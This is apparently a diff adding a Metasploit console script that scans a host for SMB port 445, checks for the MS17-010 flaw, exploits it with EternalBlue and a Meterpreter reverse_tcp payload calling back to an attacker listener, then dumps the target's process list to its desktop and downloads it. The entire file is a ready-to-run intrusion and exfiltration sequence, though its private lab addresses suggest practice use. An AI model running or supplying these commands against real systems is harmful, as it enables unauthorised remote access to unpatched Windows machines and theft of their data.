@@ -1,0 +1,40 @@
+# Launch Metasploit Framework
+msfconsole
+
+# Step 1: Scan for Open SMB Port (445)
+use auxiliary/scanner/portscan/tcp
+set RHOSTS 192.168.56.1
+set PORTS 445
+run
+
+# Step 2: Check for MS17-010 Vulnerability (EternalBlue)
+use auxiliary/scanner/smb/smb_ms17_010
+set RHOSTS 192.168.56.1
+run
+
+# Step 3: Attempt to Exploit MS17-010 Vulnerability
+use exploit/windows/smb/ms17_010_eternalblue
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set RHOSTS 192.168.56.1
+set RPORT 445
+set LHOST 192.168.56.100   # Replace with your attacking machine's IP
+set LPORT 4444              # Replace with your desired listening port
+exploit
+
+# Step 4: Verify Active Sessions
+sessions
+
+# Step 5: Interact with the Meterpreter Session
+sessions -i 1               # Replace '1' with your actual session ID
+
+# Step 6: List Running Processes on Target
+ps
+
+# Step 7: Export the Process List to a File on Target's Desktop
+ps > C:\Users\DELL\Desktop\processes_list.txt
+
+# Step 8: Download the Process List to Attacking Machine
+download C:\Users\DELL\Desktop\processes_list.txt
+
+# Exit Metasploit
+exit
